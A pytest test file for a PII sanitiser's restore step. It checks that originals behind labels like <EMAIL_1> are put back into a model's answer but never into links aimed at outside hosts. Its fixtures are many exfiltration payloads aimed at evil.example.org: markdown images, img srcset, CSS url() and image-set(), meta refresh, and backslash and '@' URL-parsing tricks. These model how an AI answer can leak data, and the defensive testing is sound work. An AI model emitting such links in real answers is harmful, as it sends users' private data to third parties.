import ipaddress

import pytest

from cleaner.core.entities import netmap, ops
from cleaner.core.pipeline import sanitize
from cleaner.core.restore import RestoreResult, StreamRestorer, restore
from cleaner.core.types import ChatRule, ChatState, Entity, Policy, Settings, Surrogate, default_policies
from cleaner.core.types import EntityType as T


def person_state(style: str = "angle") -> ChatState:
    state = ChatState(chat_id="people", net_key=bytes(range(32)), label_style=style)
    left, right = ("<", ">") if style == "angle" else ("[[", "]]")
    for number, name in ((1, "Иван Петров"), (10, "Пётр Сидоров")):
        entity = Entity(f"p{number}", T.PERSON, number, name.lower(), name, "manual", [name])
        state.entities[entity.id] = entity
        state.surrogates[f"{left}PERSON_{number}{right}"] = Surrogate(entity.id)
    return state


def infra_state() -> ChatState:
    state = ChatState(chat_id="infra", net_key=bytes(range(32)))
    text = "srv-web01.corp.contoso.ru, адрес 10.1.2.5, MAC 00:1A:2B:3C:4D:5E, пароль: Qwerty123!"
    sanitize(state, text, Settings())
    return state


def kinds(result: RestoreResult) -> list[str]:
    return [segment.kind for segment in result.segments]


def test_altered_labels_are_restored_and_unknown_ones_are_marked(settings):
    answer = (
        r"A: \<PERSON\_1\>, B: &lt;PERSON_1&gt;, C: PERSON_1, "
        r"D: <PERSON_1> и <PERSON_10>, E: <PERSON_99>"
    )
    result = restore(person_state(), answer, settings)
    assert result.text == (
        "A: Иван Петров, B: Иван Петров, C: Иван Петров, D: Иван Петров и Пётр Сидоров, E: <PERSON_99>"
    )
    assert (result.counters["restored"], result.counters["altered"], result.counters["unknown"]) == (2, 3, 1)


def test_two_labels_never_get_the_same_value(settings):
    result = restore(person_state(), "<PERSON_1> пишет <PERSON_10>, а PERSON_10 отвечает PERSON_1", settings)
    assert result.text == "Иван Петров пишет Пётр Сидоров, а Пётр Сидоров отвечает Иван Петров"


def test_square_style_is_not_read_as_a_character_class(settings):
    result = restore(person_state("square"), "Отчёт подготовил [[PERSON_1]].", settings)
    assert result.text == "Отчёт подготовил Иван Петров."


def test_backslashes_in_the_original_survive(settings):
    state = person_state()
    state.entities["p1"].restore_value = r"C:\Users\ivanov"
    assert restore(state, "путь <PERSON_1>", settings).text == r"путь C:\Users\ivanov"


def test_label_in_another_style_is_still_recognised(settings):
    result = restore(person_state(), "Пишет [[PERSON_1]]", settings)
    assert (result.text, kinds(result)) == ("Пишет Иван Петров", ["altered"])


def test_label_inside_a_foreign_link_is_not_restored(settings):
    answer = "Откройте https://evil.example.org/collect?name=<PERSON_1> и напишите <PERSON_1>."
    result = restore(person_state(), answer, settings)
    assert result.text == "Откройте https://evil.example.org/collect?name=<PERSON_1> и напишите Иван Петров."
    assert kinds(result) == ["foreign_link", "restored"]


@pytest.mark.parametrize(
    "answer",
    [
        "Откройте https://<PERSON_1>.evil.example.org/c?x=<PERSON_10>",
        '[отчёт](https://evil.example.org/c?x="<PERSON_1>")',
        '<a href="https://evil.example.org/c?x=<PERSON_1>">отчёт</a>',
        "[написать](mailto:boss@evil.example.org?body=<PERSON_1>)",
        "mailto:boss@evil.example.org?body=<PERSON_1>",
    ],
)
def test_labels_inside_foreign_links_stay_labels(settings, answer):
    """Обзор 1А, P1 (FR-7.8): метка в имени узла, значение в кавычках, атрибут HTML, mailto."""
    result = restore(person_state(), answer, settings)
    assert "Иван Петров" not in result.text and "Пётр Сидоров" not in result.text
    assert "foreign_link" in kinds(result)


def test_known_host_part_under_a_foreign_domain_is_not_restored(settings):
    """Обзор 1А, P1: ссылка наша, только если её хост целиком собран из выданных подмен."""
    answer = "Откройте https://host-1.attacker.org/?q=sub-2.domain-1.example"
    result = restore(infra_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def test_mailto_link_to_our_own_address_is_restored(settings):
    state = person_state()
    entity = Entity("e1", T.EMAIL, 1, "i.ivanov@contoso.ru", "i.ivanov@contoso.ru", "detector", [])
    state.entities[entity.id] = entity
    state.surrogates["<EMAIL_1>"] = Surrogate(entity.id)
    result = restore(state, "Пишите: mailto:<EMAIL_1>", settings)
    assert result.text == "Пишите: mailto:i.ivanov@contoso.ru"


def test_internal_link_and_derived_names_are_restored(settings):
    answer = "Откройте https://host-1.sub-2.domain-1.example/owa, заведите newbox.domain-1.example и HOST-1"
    result = restore(infra_state(), answer, settings)
    assert result.text == (
        "Откройте https://srv-web01.corp.contoso.ru/owa, заведите newbox.contoso.ru и SRV-WEB01"
    )
    assert kinds(result) == ["restored", "derived", "restored"]


def test_address_in_a_known_fake_subnet_is_derived(settings):
    state = infra_state()
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    neighbour = fake.rsplit(".", 1)[0] + ".99"
    result = restore(state, f"Основной {fake}, резервный {neighbour}", settings)
    assert result.text == "Основной 10.1.2.5, резервный 10.1.2.99"
    assert kinds(result) == ["restored", "derived"]


def test_reformatted_mac_is_recognised(settings):
    result = restore(infra_state(), "интерфейс 02-00-00-00-00-01", settings)
    assert (result.text, kinds(result)) == ("интерфейс 00:1A:2B:3C:4D:5E", ["altered"])


def test_secret_stays_hidden(settings):
    result = restore(infra_state(), "Пароль <SECRET_1> лучше сменить", settings)
    assert (result.text, kinds(result)) == ("Пароль <SECRET_1> лучше сменить", ["kept_by_policy"])
    assert result.counters["kept"] == 1


@pytest.mark.parametrize("answer", ["", "Ответ без меток: перезапустите службу."])
def test_answer_without_surrogates_is_returned_unchanged(settings, answer):
    for state in (person_state(), ChatState(chat_id="empty", net_key=bytes(32))):
        result = restore(state, answer, settings)
        assert (result.text, result.segments) == (answer, [])


def test_original_is_not_planted_inside_other_words(settings):
    state = person_state()
    state.entities["p1"].restore_value = "Ann"
    assert restore(state, "Annual report by <PERSON_1>", settings).text == "Annual report by Ann"


def test_foreign_label_from_the_input_is_not_reported(settings):
    state = person_state()
    state.foreign_labels.add("<PERSON_7>")
    result = restore(state, "В шаблоне <PERSON_7>", settings)
    assert (result.text, result.segments) == ("В шаблоне <PERSON_7>", [])


def link_state() -> ChatState:
    state = ChatState(chat_id="links", net_key=bytes(range(32)))
    sanitize(state, "Пишет ivanov@contoso.ru с srv-dc01.contoso.ru, адрес 10.1.2.5", Settings())
    return state


def fake_ip(state: ChatState) -> str:
    return next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")


@pytest.mark.parametrize(
    "answer",
    [
        "[отчёт](https://evil.example.org/x?q=(a)<EMAIL_1>)",
        "![img](https://evil.example.org/x_(1)/<EMAIL_1>.png)",
        r"https://evil.example.org\@host-1.domain-1.example/?q=<EMAIL_1>",
        "https://evil.example.org?@host-1.domain-1.example/?q=<EMAIL_1>",
        "https://evil.example.org#@host-1.domain-1.example/?q=<EMAIL_1>",
        "[x](https://evil.example.org?@{ip}/?q=<EMAIL_1>)",
        "https://evil.example.org/?q='<EMAIL_1>'",
        "[1]: https://evil.example.org/?q='<EMAIL_1>'",
        "<img srcset=\"https://evil.example.org/p?q='<EMAIL_1>' 1x\">",
        "<form action=\"https://evil.example.org/c?q='<EMAIL_1>'\">",
        "www.evil.example.org/?q=<EMAIL_1>",
    ],
)
def test_nothing_is_restored_inside_a_foreign_link(settings, answer):
    """Обзор пакета исправлений 1А, P1 (FR-7.8): скобки в цели, хост по правилам браузера, кавычки,
    определения ссылок, атрибуты с адресом и адреса на «www.»."""
    state = link_state()
    answer = answer.format(ip=fake_ip(state))
    result = restore(state, answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def test_host_is_after_the_last_at_sign(settings):
    """Найдено при исправлении обратных косых, P1: браузер берёт хост за последним «@» адреса, а не за первым —
    «https://a@наш:1@evil…» ведёт на evil. Имя пользователя и пароль у нашего адреса ссылку чужой не делают."""
    answer = "https://a@host-1.domain-1.example:1@evil.example.org/?q=<EMAIL_1>"
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
    own = restore(link_state(), "https://a:b@host-1.domain-1.example:8080/?q=<EMAIL_1>", settings)
    assert own.text == "https://a:b@srv-dc01.contoso.ru:8080/?q=ivanov@contoso.ru"


def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
    state = link_state()
    own = restore(state, "https://host-1.domain-1.example/?q=<EMAIL_1>", settings)
    assert own.text == "https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru"
    near = restore(state, '{"url":"https://evil.example.org/x","owner":"<EMAIL_1>"}', settings)
    assert near.text == '{"url":"https://evil.example.org/x","owner":"ivanov@contoso.ru"}'
    after = restore(state, "[docs](https://evil.example.org/x_(1)) пишет <EMAIL_1>", settings)
    assert after.text == "[docs](https://evil.example.org/x_(1)) пишет ivanov@contoso.ru"
    plain = restore(state, "Сайт www.example.org без меток", settings)
    assert (plain.text, plain.segments) == ("Сайт www.example.org без меток", [])


@pytest.mark.parametrize(
    "answer",
    [
        r'<img src="\\evil.example.org/p?q=<EMAIL_1>">',
        r'<a href="https:\\evil.example.org/?q=<EMAIL_1>">',
        r"https://\evil.example.org/?q=<EMAIL_1>",
        r"[x](https:/\evil.example.org/?q=<EMAIL_1>)",
        r'<img src="/\evil.example.org/p?q=<EMAIL_1>">',
        '<a href="ht\ntps:\t\\\\evil.example.org/?q=<EMAIL_1>">',
        '<img src="http:evil.example.org/p?q=<EMAIL_1>">',
        "https:evil.example.org/?q=<EMAIL_1>",
        r"file:\\evil.example.org\share\<EMAIL_1>",
        r"\\evil.example.org\share\<EMAIL_1>",
        r"[x](https://host-1.domain-1.example/?next=\\evil.example.org/<EMAIL_1>)",
    ],
)
def test_backslashes_and_missing_slashes_lead_a_link_to_a_foreign_host(settings, answer):
    """Хэнд-офф, P1: браузер читает «\\» в адресе с особой схемой как «/» и пропускает любую череду косых после
    схемы, даже пустую, — все эти адреса ведут на evil.example.org (WHATWG URL)."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (r"https:\\host-1.domain-1.example\wiki?u=<EMAIL_1>", r"https:\\srv-dc01.contoso.ru\wiki?u=ivanov@contoso.ru"),
        (r'<a href="\\host-1.domain-1.example\s\<EMAIL_1>">', r'<a href="\\srv-dc01.contoso.ru\s\ivanov@contoso.ru">'),
        (r'path = "C:\\Users\\<EMAIL_1>\\report.docx"', r'path = "C:\\Users\\ivanov@contoso.ru\\report.docx"'),
    ],
)
def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш адрес с обратными косыми восстанавливается, а «\\\\» внутри пути
    Windows в строке кода — не начало адреса."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        "<img src=\"https://evil.example.org/p?q=\n<EMAIL_1>\">",
        "<img src=\"https://host-1.domain-1.example\t@evil.example.org/p?q=<EMAIL_1>\">",
        "<img src=\"https://host-1.domain-1.example\n@evil.example.org/p?q=<EMAIL_1>\">",
        "[1]: <https://evil.example.org/p?q=a <EMAIL_1>>",
        "<div style=\"background:url(https://evil.example.org/p?q=<EMAIL_1>)\">",
    ],
)
def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings, answer):
    """FINDINGS P1 «Restore: originals still reach foreign links split by whitespace»: браузер выбрасывает
    из адреса переводы строк и табуляции, атрибут с адресом тянется через строки, цель определения ссылки
    в угловых скобках — с пробелами, CSS url() в style загружается сам."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1>")}</style>',
        "<style>a{background:url( 'https://evil.example.org/?q= <EMAIL_1>' )}</style>",
        "a { background: URL(https://evil.example.org/?q= <EMAIL_1>) }",
        '@font-face { src: url("https://evil.example.org/f?q=\\" <EMAIL_1>") }',
        'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
        '@import "https://evil.example.org/?q= <EMAIL_1>";',
        "@import url('https://evil.example.org/?q= <EMAIL_1>');",
    ],
)
def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
    """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)»."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer",
    [
        '<style>a{background-image:image-set("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
        "<style>a{background-image:-webkit-image-set('https://evil.example.org/?q= <EMAIL_1>' 1x)}</style>",
        '@font-face { src: src("https://evil.example.org/f?q= <EMAIL_1>") }',
        'a { background: image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: IMAGE-SET(\n  "a.png" 1x,\n  "https://evil.example.org/?q= <EMAIL_1>" 2x\n) }',
        'a { background: image-set(linear-gradient(rgb(0 0 0/50%), red) 1x,'
        ' "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set("a).png" 1x, /* ) */ "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set(var(--a, {;}) 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        'a { background: image-set(' + "f(" * 6 + ")" * 6 + ' 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
        '<style>a{background:image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>"',
    ],
)
def test_nothing_is_restored_inside_a_foreign_css_image_set(settings, answer):
    """Хэнд-офф, P2: строку в image-set() — в любом варианте, не только в первом, — и в src() браузер загружает
    сам, как url(). Вызов берётся целиком по скобкам: градиент, var() с блоком, «)» в строке и в комментарии его
    не кончают; вложенность глубже разбираемой и незакрытый вызов тянутся до конца ответа."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            'b { background: image-set("img/<EMAIL_1>.png" 1x) }',
            'b { background: image-set("img/ivanov@contoso.ru.png" 1x) }',
        ),
        (
            'b { background: image-set("https://host-1.domain-1.example/a b.png" 1x, "c.png" 2x) }',
            'b { background: image-set("https://srv-dc01.contoso.ru/a b.png" 1x, "c.png" 2x) }',
        ),
        (
            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор <EMAIL_1> */',
            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор ivanov@contoso.ru */',
        ),
        (
            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор <EMAIL_1>",
            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
        ),
    ],
)
def test_own_and_nearby_css_image_sets_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш и относительный адрес в image-set() восстанавливаются, метка после
    закрытого вызова — тоже, и в тексте, где image-set() только упомянут."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            '<style>a{background:url("https://host-1.domain-1.example/a b.png")}</style>',
            '<style>a{background:url("https://srv-dc01.contoso.ru/a b.png")}</style>',
        ),
        ("a { background: url(img/<EMAIL_1>.png) }", "a { background: url(img/ivanov@contoso.ru.png) }"),
        (
            'a { background: url("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
            'a { background: url("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
        ),
    ],
)
def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
    """Та же находка с другой стороны: наш и относительный адрес в url() восстанавливаются, метка
    рядом с чужим url() — тоже."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer, restored",
    [
        (
            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор <EMAIL_1>")',
            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор ivanov@contoso.ru")',
        ),
        (
            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x <EMAIL_1>")',
            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x ivanov@contoso.ru")',
        ),
    ],
)
def test_keyword_argument_in_code_is_not_a_link_attribute(settings, answer, restored):
    """FINDINGS P3 «Small regressions and gaps after the plan 1В fixes», восстановление: data=, content= в
    вызове вне тегов HTML — не атрибут ссылки; адреса в значении проверяются как в обычном тексте."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        'requests.post(url, data="https://evil.example.org/?q=<EMAIL_1>")',
        '<img alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
        '<a title="a>b" href="https://evil.example.org/?q= <EMAIL_1>">',
        '<!-- <a title=" --> <img data-x=" <b>" alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
        'Добавьте в тег srcset="https://evil.example.org/?q= <EMAIL_1>"',
    ],
)
def test_attribute_that_may_be_inside_a_tag_stays_a_link(settings, answer):
    """Та же находка с другой стороны: всё, что может оказаться атрибутом тега, — по-прежнему ссылка."""
    result = restore(link_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def labelled_hosts() -> tuple[ChatState, Settings]:
    """Адрес, чья подмена совпала с открытым адресом (раздел 6.2), и имя узла не того вида получают метки."""
    state = ChatState(chat_id="labelled", net_key=bytes(range(32)))
    real = ipaddress.IPv4Address("192.168.1.5")
    fake = str(ipaddress.IPv4Address(netmap.map_private(int(real), 16, state.net_key)))
    settings = Settings(never=frozenset({fake}))
    state.rules.append(ChatRule("mask", "srv web 02", T.HOST))
    sanitize(state, f"адрес {real} рядом с {fake}, узел srv web 02, почта ivanov@contoso.ru", settings)
    assert {"<IP_1>", "<HOST_1>", "<EMAIL_1>"} <= set(state.surrogates)
    return state, settings


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("http://<IP_1>:8080/status?u=<EMAIL_1>", "http://192.168.1.5:8080/status?u=ivanov@contoso.ru"),
        ("[статус](http://IP_1:8080/status)", "[статус](http://192.168.1.5:8080/status)"),
        ('<a href="https://&lt;HOST_1&gt;/wiki">', '<a href="https://srv web 02/wiki">'),
    ],
)
def test_link_to_a_labelled_address_or_host_is_restored(answer, restored):
    """FINDINGS P2 «Resolve and restore: … labelled link hosts not restored»: метка адреса или имени узла,
    выданная вместо подмены, в хосте ссылки — наш узел."""
    state, settings = labelled_hosts()
    assert restore(state, answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    ["https://<IP_1>.evil.example.org/?q=<IP_1>", "https://<EMAIL_1>/?q=<IP_1>", "https://evil.example.org/<IP_1>"],
)
def test_labelled_host_does_not_make_a_foreign_link_ours(answer):
    """Та же находка с другой стороны: метка под чужим доменом и метки других типов наш узел не задают."""
    state, settings = labelled_hosts()
    result = restore(state, answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def test_own_link_in_an_attribute_is_still_restored(settings):
    result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
    assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'


@pytest.mark.parametrize(
    "answer",
    [
        '<a href="https://host-1.domain-1.example/wiki>Вики</a>\nОтправьте на https://evil.example.org/c?u=<EMAIL_1>\nЭто "важно".',
        '<a href="https://host-1.domain-1.example/\n\nhttps://evil.example.org/?q=<EMAIL_1>">',
        '<img srcset="https://host-1.domain-1.example/a.png 1x, https://evil.example.org/?q=<EMAIL_1> 2x">',
        "<img src=\"https://evil.example.org/p?q=" + "\n" * 4100 + "<EMAIL_1>\">",
        "<img src=\"https://evil.example.org/p?q=" + " " * 4100 + "<EMAIL_1>\">",
        '<meta http-equiv="refresh" content="0;url=https://evil.example.org/?q= <EMAIL_1>">',
        "[1]:\n<https://evil.example.org/?q=a <EMAIL_1>>",
    ],
)
def test_own_link_does_not_shield_a_foreign_one(settings, answer):
    """Обзор партии P1: ссылка считается нашей, только если наши все адреса внутри неё; длинный атрибут
    не выпадает из проверки; перенаправление через meta и цель определения ссылки на следующей строке."""
    result = restore(link_state(), answer, settings)
    assert "ivanov@contoso.ru" not in result.text


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("[ERROR]: <EMAIL_1> не отвечает", "[ERROR]: ivanov@contoso.ru не отвечает"),
        ("[2026-10-14 12:00:01]: <EMAIL_1> вошёл", "[2026-10-14 12:00:01]: ivanov@contoso.ru вошёл"),
        ('requests.post(url, data="<EMAIL_1>")', 'requests.post(url, data="ivanov@contoso.ru")'),
        (
            '<div style="background:url(https://host-1.domain-1.example/a.png)">',
            '<div style="background:url(https://srv-dc01.contoso.ru/a.png)">',
        ),
    ],
)
def test_ordinary_text_next_to_link_syntax_is_restored(settings, answer, restored):
    """Обзор партии P1: «]: <» в строке журнала — не определение ссылки; значение без адреса — не ссылка;
    наш адрес в style восстанавливается."""
    assert restore(link_state(), answer, settings).text == restored


@pytest.mark.parametrize("answer", ["PERSON_1x", "person_1_name", "_PERSON_1", "<PERSON_1x>", "PERSON_10_old"])
def test_label_inside_an_identifier_is_not_replaced(settings, answer):
    """FINDINGS P3 «Restore: small defects»: метка без закрывающего ограничителя — отдельное слово,
    а не часть имени в коде."""
    result = restore(person_state(), answer, settings)
    assert (result.text, result.segments) == (answer, [])


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("PERSON_1.", "Иван Петров."), ("(person_1)", "(Иван Петров)"), ("PERSON_1-му", "Иван Петров-му"),
        ("<PERSON_1 >x", "Иван Петровx"),
    ],
)
def test_bare_label_next_to_punctuation_is_restored(settings, answer, restored):
    """Та же находка с другой стороны: после знака препинания или ограничителя метка восстанавливается."""
    assert restore(person_state(), answer, settings).text == restored


def test_hide_policy_covers_derived_addresses_and_reformatted_macs(settings):
    """FINDINGS P3 «Restore: small defects»: политика «скрывать без восстановления» действует и на адрес
    в фиктивной подсети, и на MAC в другой записи."""
    state = infra_state()
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    answer = f"резервный {fake.rsplit('.', 1)[0]}.99, интерфейс 02-00-00-00-00-01"
    hidden = Settings(policies={**default_policies(), T.IP: Policy.HIDE, T.MAC: Policy.HIDE})
    result = restore(state, answer, hidden)
    assert (result.text, kinds(result), result.counters["kept"]) == (answer, ["kept_by_policy"] * 2, 2)
    assert kinds(restore(state, answer, settings)) == ["derived", "altered"]


def test_value_set_by_the_user_is_restored_for_hosts_addresses_macs_and_sids(settings):
    """FINDINGS P3 «Restore: small defects»: значение, заданное пользователем (FR-6.4), важнее записанного
    при выдаче; имя узла целиком собирается из значений своих частей, нетронутые части — как были."""
    state = ChatState(chat_id="fixed", net_key=bytes(range(32)))
    text = "srv-web01.corp.contoso.ru, 10.1.2.5, 00:1A:2B:3C:4D:5E, S-1-5-21-1004336348-1177238915-682003330-512"
    sanitize(state, text, settings)
    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
    sid = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "sid")
    for surrogate, value in (
        ("host-1", "srv-web02"), ("domain-1.example", "fabrikam.ru"), (fake, "10.1.2.6"),
        ("02:00:00:00:00:01", "00:1A:2B:3C:4D:5F"), (sid, "S-1-5-21-1-2-3"),
    ):
        ops.set_restore_value(state, state.surrogates[surrogate].entity_id, value)
    answer = f"host-1.sub-2.domain-1.example, HOST-1, newbox.domain-1.example, {fake}, 02-00-00-00-00-01, {sid}-512"
    assert restore(state, answer, settings).text == (
        "srv-web02.corp.fabrikam.ru, SRV-WEB02, newbox.fabrikam.ru, 10.1.2.6, 00:1A:2B:3C:4D:5F, S-1-5-21-1-2-3-512"
    )


@pytest.mark.parametrize("answer", ["EMAİL_1", "<EMAİL_1>", "[[EMAİL_1]]", "PERſON_1", "hoſt-1"])
def test_letters_that_fold_to_ascii_are_not_label_letters(settings, answer):
    """FINDINGS P3 «Restore: small defects»: «İ» и «ſ» при поиске без учёта регистра совпадали с «I» и «S»,
    и «EMAİL_1» ронял восстановление. Тип метки — латиница, другой регистр допускается только у неё."""
    state = link_state()
    state.entities.update(person_state().entities)
    state.surrogates["<PERSON_1>"] = Surrogate("p1")
    result = restore(state, answer, settings)
    assert (result.text, result.segments) == (answer, [])
    assert restore(state, "<email_1> и person_1", settings).text == "ivanov@contoso.ru и Иван Петров"


@pytest.mark.parametrize(
    "answer, restored",
    [
        ("file:///C:/Users/<PERSON_1>/a.txt", "file:///C:/Users/Иван Петров/a.txt"),
        ("x = 1; //TODO:<PERSON_1>", "x = 1; //TODO:Иван Петров"),
        ("//TODO(<PERSON_1>): проверить", "//TODO(Иван Петров): проверить"),
        (r"file:\\\C:\Users\<PERSON_1>\a.txt", r"file:\\\C:\Users\Иван Петров\a.txt"),
        (r"\\fs01\home\<PERSON_1>", r"\\fs01\home\Иван Петров"),
    ],
)
def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer, restored):
    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут;
    с обратными косыми (хэнд-офф, P1) — так же, и путь UNC к узлу без домена тоже."""
    assert restore(person_state(), answer, settings).text == restored


@pytest.mark.parametrize(
    "answer",
    [
        "file://evil.example.org/share/<PERSON_1>",
        "file:////evil.example.org/share/<PERSON_1>",
        "//<PERSON_1>.evil.example.org/x",
        "///evil.example.org/?q=<PERSON_1>",
        "//1572395042/?q=<PERSON_1>",
        "//evil%2Eexample%2Eorg/?q=<PERSON_1>",
        "//evil。example。org/?q=<PERSON_1>",
        "//TODO:x//evil/?q=<PERSON_1>",
        r"\\1572395042\?q=<PERSON_1>",
        r"\\fs01\?next=\\1572395042\<PERSON_1>",
    ],
)
def test_file_and_protocol_relative_links_to_a_host_stay_foreign(settings, answer):
    """Та же находка с другой стороны: хост у «file://», имя с точкой (и то, что браузер превратит в точку),
    число вместо IPv4 и второй адрес — в том числе за обратными косыми — оставляют ссылку чужой."""
    result = restore(person_state(), answer, settings)
    assert (result.text, kinds(result)) == (answer, ["foreign_link"])


def _stream_state() -> ChatState:
    state = person_state()
    sanitize(state, "почта i.petrov@contoso.ru, узел srv-db02.contoso.ru, адрес 10.1.2.5", Settings())
    return state


def test_label_cut_at_every_position_restores_like_the_whole_answer(settings):
    """AC-3.3: метка разрезана между фрагментами в каждой позиции — промежуточный показ не врёт, итог как у целого."""
    state = _stream_state()
    [host] = [text for text, s in state.surrogates.items() if text.startswith("host-") and "domain-" in text]
    [ip] = [text for text, s in state.surrogates.items() if s.kind == "ip"]
    answer = f"Связаться: <PERSON_10> и <PERSON_1>, \\<EMAIL\\_1\\>; узел {host}, адрес {ip}.\nГотово"
    whole = restore(state, answer, settings).text
    for cut in range(len(answer) + 1):
        restorer = StreamRestorer(state, settings)
        shown = [restorer.feed(answer[:cut]), restorer.feed(answer[cut:])]
        for text in shown:
            assert "Иван Петров0" not in text and "Иван Петров" not in text.replace("Иван Петров,", ""), (cut, text)
            assert whole.startswith(text), (cut, text)
        assert restorer.finish().text == whole


def test_nothing_is_shown_before_the_first_space(settings):
    restorer = StreamRestorer(person_state(), settings)
    assert restorer.feed("<PERSON_1") == ""
    assert restorer.feed("0>") == ""
    assert restorer.feed(" пишет") == "Пётр Сидоров "


def test_long_tail_without_spaces_is_released_before_an_unfinished_replacement(settings):
    """Минифицированный JSON без пробелов: отдаётся до последнего знака, который в замену не входит."""
    restorer = StreamRestorer(person_state(), settings)
    payload = '{"items":[' + ",".join(['{"v":"x"}'] * 70) + '],"who":"<PERSON_1'
    shown = restorer.feed(payload)
    assert shown.endswith('"who":"') and "PERSON" not in shown
    assert restorer.feed('0>"}').endswith('"who":"Пётр Сидоров"}')       # «"}» закрыли замену — хвост отдан
    assert restorer.finish().text == restorer.feed("")
